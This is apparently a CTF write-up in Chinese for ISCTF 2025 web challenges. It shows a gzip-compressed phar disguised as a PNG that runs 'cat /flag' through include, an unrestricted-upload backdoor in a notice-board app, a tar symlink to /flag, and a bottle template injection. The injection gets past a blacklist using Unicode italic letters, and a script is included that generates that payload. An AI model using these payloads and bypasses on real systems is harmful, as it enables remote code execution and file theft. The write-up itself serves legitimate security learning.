# 【include_upload】
之前其实是学过phar文件包含的，做了这题之后才发现之前白学了。

1. 首先我们得知道怎么包含phar文件中的php代码，phar文件其实有3个部分都可以写php代码，并且会原样输出的![](assets/ISCTF%202025/file-20251209014648966.png)但是3个地方的php代码并不是都可以被解析，（我之前一直以为一个文件里面只要有php代码，被include之后就可以被解析）
实验文件：phar.php include.php
```php
<?php
class TestObject {
    public $a="<?php echo '触发matedata中的php代码'; ?>";
}

@unlink("phar.phar");                  // 删除旧的 phar 文件（如果存在）

$phar = new Phar("phar.phar");         // 创建一个新的 phar 对象，文件名必须以 .phar 结尾
$phar->startBuffering();               // 开始缓冲（准备写入 phar 内容）

$phar->setStub("<?php echo '触发stub中的php代码';  __HALT_COMPILER(); ?>");  // 设置 stub（文件头部的启动代码）

$o = new TestObject();
// 实例化一个对象
$phar->setMetadata($o);                // 把对象放到 phar 的 metadata 区域（存入 manifest）

$phar->addFromString("test.txt", "<?php echo '触发phar中test.txt中的php代码'; ?>"); // 向 phar 添加一个文件 test.txt，内容为 "test"

// phar 内部会自动计算签名（默认是 SHA1）
$phar->stopBuffering();                // 停止缓冲并写入文件
?>

```
```php
<?php
highlight_file(__FILE__);
include($_GET['file']);
?>
```
* 直接include：可以直接触发stub中的php代码，但是这好像没啥用，因为文件内容并不会不可见什么的，也就是说该过滤文件内容还是过滤和直接上传php文件没有差别。![](assets/ISCTF%202025/file-20251209013432455.png)
* 用phar伪协议：可以去触发里层文件的php代码，但是要加上路劲，（这里有一个用法，就是phar伪协议会自动去解压压缩包并且得到里面的文件，这样就可以被include了![](assets/ISCTF%202025/file-20251209013800824.png)
好了，这上面的对题目其实没有用，单纯是我的个人疑惑。。。。
2. 我们绕过phar文件中stub部分`__HALT_COMPILER`过滤的时候,学过用gzip压缩过滤。说是一样可以触发反序列化的。至于为什么可以看文章：
 https://www.anquanke.com/post/id/240007#h2-5 。

3. 对于include函数而言，识别一个文件是不是phar文件名中有`.phar`则认为他是phar文件。并且对于phar文件中压缩过的内容会自动解压。并判断有没有`<?php __HALT_COMPILER();?>`文件头,没有则报错，所以如果解压出来有php代码的话，自然也会解析了。
https://xz.aliyun.com/news/18584
![](assets/ISCTF%202025/file-20251209020656891.png)![](assets/ISCTF%202025/file-20251209020707761.png)
4.  但是至于为什么反序列化的时候会解析压缩后的matedata就不是这个原因了，看上面的文章，大概是phar伪协议的原因，他的底层实现会先解压再反序列化，而且几种压缩都是可以的，`主要记住的就是这个是需要pahr伪协议的`![](assets/ISCTF%202025/file-20251209021043109.png)
总结一下就是，我终于搞清楚了
phar反序列化用gzip时是需要phar伪协议的，因为phar伪协议的底层实现会先解压再反序列化
phar文件包含用gzip绕过时是不需要伪协议的，因为那个是include的底层会对phar文件进行先解压再包含，但是要注意的是php代码要写在stub才会执行。然后小技巧就是`文件中出现了.phar即可认为是phar文件`


## wp
最后回归题目，
```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$file = $_GET['file'];
if(isset($file) && strtolower(substr($file, -4)) == ".png"){
    include'./upload/' . basename($_GET['file']);
    exit;
}
?>

```
文件包含，还有一个文件上传的点。
分析源码：
* 使用了`basename()`,这个函数会取出输入的地址中最后一个文件名（意思是abc/acs/ascsc/casc/flag.txt会被识别为flag.txt,前面省略），所以我们就不考虑目录穿越读文件了。
* `if(isset($file) && strtolower(substr($file, -4)) == ".png")`  这句话是说`$file`参数只有取出最后4个之后为`.png`才能包含，`strtolower()`函数是转化为小写。
* 总的就是只能包含`.png`后缀的文件
这里开始想到有include，那直接再png的body中写php代码也能解析的，但是也有waf。
对文件内容过滤了`php`,`<?`,总之换标签是行不通了。这里就卡住了，学了什么的小技巧才知道，对于`include()`函数只要文件名中包含了`.phar`就会当作是在include一个phar文件。并且如果文件内容经过压缩的话还能自动解压，这样phar中的可见php代码也没有了。完美绕过。

实践：
首先通过脚本生成一个phar文件，
```php
<?php
class TestObject {
    public $a="<?php echo '触发matedata中的php代码'; ?>";
}
@unlink("phar.phar");                  // 删除旧的 phar 文件（如果存在）

$phar = new Phar("phar.phar");         // 创建一个新的 phar 对象，文件名必须以 .phar 结尾
$phar->startBuffering();               // 开始缓冲（准备写入 phar 内容）

$data = '<?php system($_GET["cmd"]);?>';

$phar->setStub('<?php system("cat /flag") ;  __HALT_COMPILER(); ?>');  // 设置 stub（文件头部的启动代码）

$o = new TestObject();
// 实例化一个对象
$phar->setMetadata($o);                // 把对象放到 phar 的 metadata 区域（存入 manifest）

$phar->addFromString("test.txt", "<?php echo '触发phar中test.txt中的php代码'; ?>"); // 向 phar 添加一个文件 test.txt，内容为 "test"

// phar 内部会自动计算签名（默认是 SHA1）
$phar->stopBuffering();                // 停止缓冲并写入文件

?>
```
并且通过
`gzip -c phar.phar >1.phar.png`命令把压缩后的phar文件直接写入一个png文件，然后上传就好了![](assets/ISCTF%202025/file-20251209023903748.png)
已经成功绕过，得到flag（后面不是同一个所以文件名有差异）
![](assets/ISCTF%202025/file-20251209025753308.png)

# 【b@by n0t1ce b0ard】
这里其实网上随便搜一下相关漏洞，就有告诉你怎么回事（谁能想到是一个高中生一年前发现的CVE！！！）
https://vuldb.com/?submit.456458，
![](assets/ISCTF%202025/file-20251209165650990.png)
文章说的很清楚，注册的时候文件上传没有限制，并且会保存到固定目录`/images/{USER-EMAIL}/{UPLOAD_FILENAME}`下，我们直接访问即可执行文件。
但是这个代码并不复杂，所以我们看一下。
## 代码审计
![300](assets/ISCTF%202025/file-20251209170013553.png)
文件结构在这里，我们就先看外层文件，出去css，还有一些一两行的配置文件，剩下有价值的就只有`login.php`、`registraction.php`了
先看一下登录：
```php
<?php
extract($_POST);
if(isset($save))
{

	if($e=="" || $p=="")
	{
	$err="<font color='red'>fill all the fileds first</font>";
	}
	else
	{
$pass=md5($p);

$sql=mysqli_query($conn,"select * from user where email='$e' and pass='$pass'");

$r=mysqli_num_rows($sql);

if($r==true)
{
$_SESSION['user']=$e;
header('location:user');
}

else
{

$err="<font color='red'>Invalid login details</font>";

}
}
}

?>
```
貌似是由sql注入？不知道（这里其实就是走个过程）
看到注册逻辑：
```php
<?php
require('connection.php');
extract($_POST);
if(isset($save))
{
//check user alereay exists or not
$sql=mysqli_query($conn,"select * from user where email='$e'");

$r=mysqli_num_rows($sql);

if($r==true)
{
$err= "<font color='red'>This user already exists</font>";
}
else
{
//dob
$dob=$yy."-".$mm."-".$dd;

//hobbies
$hob=implode(",",$hob);

//image
$imageName=$_FILES['img']['name'];


//encrypt your password
$pass=md5($p);


$query="insert into user values('','$n','$e','$pass','$mob','$gen','$hob','$imageName','$dob',now())";
mysqli_query($conn,$query);

//upload image

mkdir("images/$e");
move_uploaded_file($_FILES['img']['tmp_name'],"images/$e/".$_FILES['img']['name']);


$err="<font color='blue'>Registration successfull !!</font>";

}
}

?>
```
很明显直接把上传的文件从tmp目录移动到了固定目录
```php
move_uploaded_file($_FILES['img']['tmp_name'],"images/$e/".$_FILES['img']['name']);


```
通过前面知道`$e`就是`email`,
```php
$sql=mysqli_query($conn,"select * from user where email='$e'");
```
就找到了，任意文件上传，传一个后门就好了。
![](assets/ISCTF%202025/file-20251209171718649.png)
# 【flag？我就借走了】
题目上来就是一个文件上传的点，支持上传.png .avif .webp .gif .jxl .txt文件，还有一个`tar`，这里他把tar单独放出来还加粗了，那应该就是暗示我们用tar了。上传到`/download`目录，并且会自动解压。我有点不知道什么意思了。
先打一个php文件上传
![200](assets/ISCTF%202025/file-20251210084125920.png)
成功了？点击发现直接下载了。。。。之后尝试了一下其他文件，好像就是允许直接上传的文件可以直接打开查看，不允许的就会触发下载。这里学习一个新的用法，软连接。
```bash
┌──(root💀JYli)-[~/tmp]
└─# ln -s /flag link #创建一个指向 /flag 的软链接

┌──(root💀JYli)-[~/tmp]
└─# tar -cvf  exp.tar link #把软连接文件给打包
link
```

这样就把软连接打包好了，软连接里面相当于就是存储了一个路径（并不是像硬链接一样指向iNode节点），所以不管这个软连接文件在哪里，都是可以用的，只要对方主机也有相同路径。就能达到相同的结果。
我们把文件上传
![300](assets/ISCTF%202025/file-20251210085525241.png)
看到成功把软连接上传成功了，此时相当于对方在`/download`目录下面创建了一个指向`/flag`的软连接，我们访问一样是触发下载，但是此时内容就变成flag了。
![300](assets/ISCTF%202025/file-20251210085709167.png)
![](assets/ISCTF%202025/file-20251210085846562.png)
# 【难过的bottle】
```python
from bottle import route, run, template, post, request, static_file, error
import os
import zipfile
import hashlib
import time
import shutil


# hint: flag is in /flag

UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)
MAX_FILE_SIZE = 1 * 1024 * 1024  # 1MB

BLACKLIST = ["b","c","d","e","h","i","j","k","m","n","o","p","q","r","s","t","u","v","w","x","y","z","%",";",",","<",">",":","?"]

def contains_blacklist(content):
    """检查内容是否包含黑名单中的关键词（不区分大小写）"""
    content = content.lower()
    return any(black_word in content for black_word in BLACKLIST)

def safe_extract_zip(zip_path, extract_dir):
    """安全解压ZIP文件（防止路径遍历攻击）"""
    with zipfile.ZipFile(zip_path, 'r') as zf:
        for member in zf.infolist():
            member_path = os.path.realpath(os.path.join(extract_dir, member.filename))
            if not member_path.startswith(os.path.realpath(extract_dir)):
                raise ValueError("非法文件路径: 路径遍历攻击检测")
            
            zf.extract(member, extract_dir)

@route('/')
def index():
    """首页"""
    return '''
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZIP文件查看器</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="header text-center">
        <div class="container">
            <h1 class="display-4 fw-bold">📦 ZIP文件查看器</h1>
            <p class="lead">安全地上传和查看ZIP文件内容</p>
        </div>
    </div>
    <div class="container">
        <div class="row justify-content-center" id="index-page">
            <div class="col-md-8 text-center">
                <div class="card">
                    <div class="card-body p-5">
                        <div class="emoji-icon">📤</div>
                        <h2 class="card-title">轻松查看ZIP文件内容</h2>
                        <p class="card-text">上传ZIP文件并安全地查看其中的内容，无需解压到本地设备</p>
                        <div class="mt-4">
                            <a href="/upload" class="btn btn-primary btn-lg px-4 me-3">
                                📁 上传ZIP文件
                            </a>
                            <a href="#features" class="btn btn-outline-secondary btn-lg px-4">
                                ℹ️ 了解更多
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="row mt-5" id="features">
            <div class="col-md-4 mb-4">
                <div class="card h-100">
                    <div class="card-body text-center p-4">
                        <div class="emoji-icon">🛡️</div>
                        <h4>安全检测</h4>
                        <p>系统会自动检测上传文件，防止路径遍历攻击和恶意内容</p>
                    </div>
                </div>
            </div>
            <div class="col-md-4 mb-4">
                <div class="card h-100">
                    <div class="card-body text-center p-4">
                        <div class="emoji-icon">📄</div>
                        <h4>内容预览</h4>
                        <p>直接在线查看ZIP文件中的文本内容，无需下载</p>
                    </div>
                </div>
            </div>
            <div class="col-md-4 mb-4">
                <div class="card h-100">
                    <div class="card-body text-center p-4">
                        <div class="emoji-icon">⚡</div>
                        <h4>快速处理</h4>
                        <p>高效处理小于1MB的ZIP文件，快速获取内容</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
    '''

@route('/upload')
def upload_page():
    """上传页面"""
    return '''
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>上传ZIP文件</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="header text-center">
        <div class="container">
            <h1 class="display-4 fw-bold">📦 ZIP文件查看器</h1>
            <p class="lead">安全地上传和查看ZIP文件内容</p>
        </div>
    </div>
    <div class="container mt-4">
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header bg-primary text-white">
                        <h4 class="mb-0">📤 上传ZIP文件</h4>
                    </div>
                    <div class="card-body">
                        <form action="/upload" method="post" enctype="multipart/form-data" class="upload-form">
                            <div class="mb-3">
                                <label for="fileInput" class="form-label">选择ZIP文件（最大1MB）</label>
                                <input class="form-control" type="file" name="file" id="fileInput" accept=".zip" required>
                                <div class="form-text">仅支持.zip格式的文件，且文件大小不超过1MB</div>
                            </div>
                            <button type="submit" class="btn btn-primary w-100">
                                📤 上传文件
                            </button>
                        </form>
                    </div>
                </div>
                <div class="text-center mt-4">
                    <a href="/" class="btn btn-outline-secondary">
                        ↩️ 返回首页
                    </a>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
    '''

@post('/upload')
def upload():
    """处理文件上传"""
    zip_file = request.files.get('file')
    if not zip_file or not zip_file.filename.endswith('.zip'):
        return '请上传有效的ZIP文件'
    
    zip_file.file.seek(0, 2)  
    file_size = zip_file.file.tell()
    zip_file.file.seek(0)  
    
    if file_size > MAX_FILE_SIZE:
        return f'文件大小超过限制({MAX_FILE_SIZE/1024/1024}MB)'
    
    timestamp = str(time.time())
    unique_str = zip_file.filename + timestamp
    dir_hash = hashlib.md5(unique_str.encode()).hexdigest()
    extract_dir = os.path.join(UPLOAD_DIR, dir_hash)
    os.makedirs(extract_dir, exist_ok=True)
    
    zip_path = os.path.join(extract_dir, 'uploaded.zip')
    zip_file.save(zip_path)
    
    try:
        safe_extract_zip(zip_path, extract_dir)
    except (zipfile.BadZipFile, ValueError) as e:
        shutil.rmtree(extract_dir) 
        return f'处理ZIP文件时出错: {str(e)}'
    
    files = [f for f in os.listdir(extract_dir) if f != 'uploaded.zip']
    
    return template('''
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>上传成功</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="header text-center">
        <div class="container">
            <h1 class="display-4 fw-bold">📦 ZIP文件查看器</h1>
            <p class="lead">安全地上传和查看ZIP文件内容</p>
        </div>
    </div>

    <div class="container mt-4">
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header bg-success text-white">
                        <h4 class="mb-0">✅ 上传成功!</h4>
                    </div>
                    <div class="card-body">
                        <div class="alert alert-success" role="alert">
                            ✅ 文件已成功上传并解压
                        </div>

                        <h5>文件列表:</h5>
                        <ul class="list-group mb-4">
                            % for file in files:
                            <li class="list-group-item d-flex justify-content-between align-items-center">
                                <span>📄 {{file}}</span>
                                <a href="/view/{{dir_hash}}/{{file}}" class="btn btn-sm btn-outline-primary">
                                    查看
                                </a>
                            </li>
                            % end
                        </ul>

                        % if files:
                        <div class="d-grid gap-2">
                            <a href="/view/{{dir_hash}}/{{files[0]}}" class="btn btn-primary">
                                👀 查看第一个文件
                            </a>
                        </div>
                        % end
                    </div>
                </div>

                <div class="text-center mt-4">
                    <a href="/upload" class="btn btn-outline-primary me-2">
                        ➕ 上传另一个文件
                    </a>
                    <a href="/" class="btn btn-outline-secondary">
                        🏠 返回首页
                    </a>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
    ''', dir_hash=dir_hash, files=files)

@route('/view/<dir_hash>/<filename:path>')
def view_file(dir_hash, filename):
    file_path = os.path.join(UPLOAD_DIR, dir_hash, filename)
    
    if not os.path.exists(file_path):
        return "文件不存在"
    
    if not os.path.isfile(file_path):
        return "请求的路径不是文件"
    
    real_path = os.path.realpath(file_path)
    if not real_path.startswith(os.path.realpath(UPLOAD_DIR)):
        return "非法访问尝试"
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
    except:
        try:
            with open(file_path, 'r', encoding='latin-1') as f:
                content = f.read()
        except:
            return "无法读取文件内容（可能是二进制文件）"
    
    if contains_blacklist(content):
        return "文件内容包含不允许的关键词"
    
    try:
        return template(content)
    except Exception as e:
        return f"渲染错误: {str(e)}"

@route('/static/<filename:path>')
def serve_static(filename):
    """静态文件服务"""
    return static_file(filename, root='static')

@error(404)
def error404(error):
    return "讨厌啦不是说好只看看不摸的吗"

@error(500)
def error500(error):
    return "不要透进来啊啊啊啊"

if __name__ == '__main__':
    os.makedirs('static', exist_ok=True)
    
    #原神，启动!
    run(host='0.0.0.0', port=5000, debug=False)
```
给了源代码，注意到` return template(content)`.直接把内容当作模板渲染。存在ssti。
这里的`content`就是我们上传一个`zip`文件解压后的内容。
源码大概就是一个
* `/upload`目录，只允许上传`.zip`文件，并且不能太大。
* `/view/<dir_hash>/<filename:path>`目录，查看文件，得到的内容直接当作模板渲染
所以我们可以想到，写一个txt文件，里面是模板语言，打成压缩包上传，然后查看并渲染。
但是注意到渲染之前会对内容进行黑名单检查
```python
BLACKLIST = ["b","c","d","e","h","i","j","k","m","n","o","p","q","r","s","t","u","v","w","x","y","z","%",";",",","<",">",":","?"]
```
只留下了flag四个字母，还有模板语言的`{{ }}`可以使用。
那就很难受了，字符串还好可以用编码绕过，但是函数方法不能都用字符串呀。
这里学习一个新的trick。`斜体字绕过`。下面有详细介绍。这里只说一下打的过程。
首先利用脚本生成对应的斜体字形式，因为字符串部分不支持斜体字，所以我们进行8进制编码，（脚本自动实现了）：
![](assets/ISCTF%202025/file-20251210151515438.png)
将得到的字符串复制到txt文件打成zip包，上传，点击查看即可。


## 斜体字绕过
参考：
1. https://www.cnblogs.com/LAMENTXU/articles/18805019
2. https://www.tremse.cn/2025/04/12/bottle%E6%A1%86%E6%9E%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7/
总的来说是 bottle框架 的`template`渲染模板函数在底层实现的时候检查不严格，所以可以把斜体字传入
但是为什么能执行呢，是因为template内部有`exec()`函数实现，该函数把字符串作为代码执行之前 会把code中当作代码处理的斜体字根据`Decomposition`
(Decomposition指的是一些字符拆解之后)
转成对应的ASCII字符（当作字符串处理的除外，如此例中，假如whoami或os为斜体，则会无法执行，因为找不到斜体的os库，和斜体的whoami命令）。这个网站有对应的`Decomposition`:
[https://www.compart.com/en/unicode](https://www.compart.com/en/unicode%E4%B8%AD%EF%BC%8C%E5%81%87%E8%AE%BE%E6%88%91%E4%BB%AC%E8%BE%93%E5%85%A5%60a%60%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%EF%BC%9A)
例如
![](assets/ISCTF%202025/file-20251210150316834.png)
看到exec是支持斜体字的；所以我们可以根据这个绕过所有字母的限制(这很变态了)。
但是有一个限制就是如果题目直接渲染我们的输入的话，都需要经过URL编码，而斜体字的URL编码一般都会有两个编码值，比如`ª`就是`%c2%aa`，但是模板解析的时候会一个编码对应一个字符，所以就用不了，只有`ª (U+00AA)，º (U+00BA)`可以通过去掉前面的`%c2`,使用`%aa,%ba`代替
但是如果可以像这道题一样文件上传并且并且直接渲染，那就很无敌了，任何字符限制都可以绕过。
这里给一个利用的脚本，会自动把payload转换为斜体字，并且把字符串的内容替换为8进制（没有字母）：
```python
def generate_ultimate_bypass(payload):
    normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    italic = "𝑎𝑏𝑐𝑑𝑒𝑓𝑔ℎ𝑖𝑗𝑘𝑙𝑚𝑛𝑜𝑝𝑞𝑟𝑠𝑡𝑢𝑣𝑤𝑥𝑦𝑧𝐴𝐵𝐶𝐷𝐸𝐹𝐺𝐻𝐼𝐽𝐾𝐿𝑀𝑁𝑂𝑃𝑄𝑅𝑆𝑇𝑈𝑉𝑊𝑋𝑌𝑍"
    trans_table = str.maketrans(normal, italic)

    result = []
    in_string = False
    quote = ""

    for ch in payload:
        # 检测引号切换字符串状态
        if ch in ("'", '"'):
            if not in_string:
                in_string = True
                quote = ch
                result.append(ch)
            elif ch == quote:
                in_string = False
                result.append(ch)
            else:
                # 字符串内遇到不同引号：转八进制避免破坏字符串
                result.append(f"\\{oct(ord(ch))[2:]}")
            continue

        # 字符串内部 → 八进制转义
        if in_string:
            result.append(f"\\{oct(ord(ch))[2:]}")
            continue

        # 代码部分 → 字母转斜体
        if ch in normal:
            result.append(ch.translate(trans_table))
        else:
            result.append(ch)

    return "".join(result)

# 测试执行
raw_payload = "{{__import__('os').popen('ls').read()}}"
print("[+] 原始:", raw_payload)
print("="*110)
out = generate_ultimate_bypass(raw_payload)
print("[+] 生成:", out)
print("="*110)
# 简单验证：黑名单检查
blacklist = set("abcdefghijklmnopqrstuvwxyz%<>,;?:")

if any(c in blacklist for c in out):
    print("[!] 检测：失败，仍包含黑名单字符")
else:
    print("[+] 检测：成功，无黑名单字符")

```
